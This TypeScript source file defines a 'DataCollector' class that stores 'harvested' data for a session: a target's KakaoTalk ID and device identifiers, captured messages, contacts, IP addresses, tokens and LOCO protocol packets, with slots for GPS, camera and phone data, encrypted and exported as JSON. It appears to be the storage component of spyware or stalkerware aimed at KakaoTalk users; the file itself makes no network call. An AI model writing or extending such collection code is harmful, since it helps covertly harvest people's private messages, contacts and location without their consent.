/**
 * 🔥 DATA COLLECTOR v31.3 SECURE 🔥
 * Encrypted data collection with security enhancements
 */

import { HarvestedData, MessageData, ContactData, IPData, LOCOPacketData } from '../types/types';
import { SecurityManager } from './SecurityManager';

export class DataCollector {
  private data: HarvestedData;
  private encryptionEnabled: boolean = true;
  private readonly MAX_MESSAGES = 10000;
  private readonly MAX_CONTACTS = 5000;
  private readonly MAX_IPS = 1000;
  private readonly MAX_PACKETS = 5000;

  constructor(sessionId: string) {
    this.data = {
      sessionId,
      user: {},
      gps: [],
      ip: [],
      camera: [],
      phone: [],
      contacts: [],
      messages: [],
      tokens: [],
      locoPackets: [],
      binaryPackets: [],
      protobufData: [],
      timestamp: new Date().toISOString()
    };
  }

  /**
   * Enable/disable encryption
   */
  setEncryption(enabled: boolean): void {
    this.encryptionEnabled = enabled;
    console.log(`[COLLECTOR] Encryption ${enabled ? 'enabled' : 'disabled'}`);
  }

  /**
   * Get collected data (decrypted if needed)
   */
  getData(): HarvestedData {
    return this.data;
  }

  /**
   * Add message with automatic encryption
   */
  addMessage(message: MessageData): void {
    // Limit storage
    if (this.data.messages.length >= this.MAX_MESSAGES) {
      this.data.messages.shift();
    }

    // Encrypt sensitive content if enabled
    if (this.encryptionEnabled && message.content) {
      try {
        message.content = SecurityManager.encrypt(message.content);
      } catch (error) {
        console.error('[COLLECTOR] Failed to encrypt message:', error);
      }
    }

    this.data.messages.push(message);
    console.log(`[COLLECTOR] Added message from ${message.senderName} (total: ${this.data.messages.length})`);
  }

  /**
   * Add contact with deduplication
   */
  addContact(contact: ContactData): void {
    // Check for duplicates
    const exists = this.data.contacts.some(c => 
      c.kakaoId === contact.kakaoId && c.chatId === contact.chatId
    );
    
    if (exists) {
      return;
    }

    // Limit storage
    if (this.data.contacts.length >= this.MAX_CONTACTS) {
      this.data.contacts.shift();
    }

    // Sanitize contact data
    contact.nickname = SecurityManager.sanitizeInput(contact.nickname);
    
    this.data.contacts.push(contact);
    console.log(`[COLLECTOR] Added contact: ${contact.nickname} (total: ${this.data.contacts.length})`);
  }

  /**
   * Add IP with validation
   */
  addIP(ip: IPData): void {
    // Validate IP format
    if (!SecurityManager.validateIP(ip.ip)) {
      console.log(`[COLLECTOR] Invalid IP format: ${ip.ip}`);
      return;
    }

    // Limit storage
    if (this.data.ip.length >= this.MAX_IPS) {
      this.data.ip.shift();
    }

    // Sanitize source
    ip.source = SecurityManager.sanitizeInput(ip.source);
    
    this.data.ip.push(ip);
    console.log(`[COLLECTOR] Added IP: ${ip.ip} from ${ip.source} (total: ${this.data.ip.length})`);
  }

  /**
   * Add LOCO packet with size limit
   */
  addLOCOPacket(packet: LOCOPacketData): void {
    // Limit storage
    if (this.data.locoPackets.length >= this.MAX_PACKETS) {
      this.data.locoPackets.shift();
    }

    // Encrypt body data if enabled
    if (this.encryptionEnabled && packet.bodyData) {
      try {
        packet.bodyData = SecurityManager.encrypt(packet.bodyData);
      } catch (error) {
        console.error('[COLLECTOR] Failed to encrypt packet:', error);
      }
    }

    this.data.locoPackets.push(packet);
  }

  /**
   * Set user data with sanitization
   */
  setUserData(userId: string, nickname: string, deviceUUID: string, deviceName: string): void {
    this.data.user = {
      kakaoId: userId,
      nickname: SecurityManager.sanitizeInput(nickname),
      deviceUUID: deviceUUID,
      deviceName: SecurityManager.sanitizeInput(deviceName),
      lastSeen: Date.now()
    };
    console.log(`[COLLECTOR] Set user data: ${nickname} (${userId})`);
  }

  /**
   * Get summary statistics
   */
  getSummary(): string {
    return `Messages: ${this.data.messages.length}/${this.MAX_MESSAGES}, ` +
           `Contacts: ${this.data.contacts.length}/${this.MAX_CONTACTS}, ` +
           `IPs: ${this.data.ip.length}/${this.MAX_IPS}, ` +
           `Packets: ${this.data.locoPackets.length}/${this.MAX_PACKETS}`;
  }

  /**
   * Export data with optional encryption
   */
  exportData(encrypt: boolean = false): string {
    const jsonData = JSON.stringify(this.data, null, 2);
    
    if (encrypt) {
      try {
        return SecurityManager.encrypt(jsonData);
      } catch (error) {
        console.error('[COLLECTOR] Failed to encrypt export:', error);
        return jsonData;
      }
    }
    
    return jsonData;
  }

  /**
   * Clear all collected data
   */
  clear(): void {
    this.data.messages = [];
    this.data.contacts = [];
    this.data.ip = [];
    this.data.locoPackets = [];
    this.data.binaryPackets = [];
    this.data.protobufData = [];
    console.log('[COLLECTOR] All data cleared');
  }

  /**
   * Get storage usage statistics
   */
  getStorageStats(): {
    messages: { current: number; max: number; percentage: number };
    contacts: { current: number; max: number; percentage: number };
    ips: { current: number; max: number; percentage: number };
    packets: { current: number; max: number; percentage: number };
  } {
    return {
      messages: {
        current: this.data.messages.length,
        max: this.MAX_MESSAGES,
        percentage: Math.round((this.data.messages.length / this.MAX_MESSAGES) * 100)
      },
      contacts: {
        current: this.data.contacts.length,
        max: this.MAX_CONTACTS,
        percentage: Math.round((this.data.contacts.length / this.MAX_CONTACTS) * 100)
      },
      ips: {
        current: this.data.ip.length,
        max: this.MAX_IPS,
        percentage: Math.round((this.data.ip.length / this.MAX_IPS) * 100)
      },
      packets: {
        current: this.data.locoPackets.length,
        max: this.MAX_PACKETS,
        percentage: Math.round((this.data.locoPackets.length / this.MAX_PACKETS) * 100)
      }
    };
  }
}